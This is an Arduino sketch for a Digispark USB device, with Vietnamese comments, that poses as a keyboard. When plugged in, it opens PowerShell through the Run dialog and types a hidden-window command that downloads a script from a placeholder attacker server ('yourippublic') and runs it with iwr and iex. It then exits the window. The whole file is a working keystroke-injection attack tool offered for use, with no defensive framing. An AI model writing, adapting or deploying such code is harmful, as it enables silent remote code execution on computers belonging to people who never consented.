#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);

  // Mở PowerShell
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Win + R
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);

  // Gửi payload: tải & thực thi script từ VPS
  DigiKeyboard.print("Start-Process powershell -WindowStyle Hidden -ArgumentList 'iwr http://yourippublic/script.ps1 ^| iex'");

  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  // Thoát khỏi cửa sổ PowerShell chính
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {}
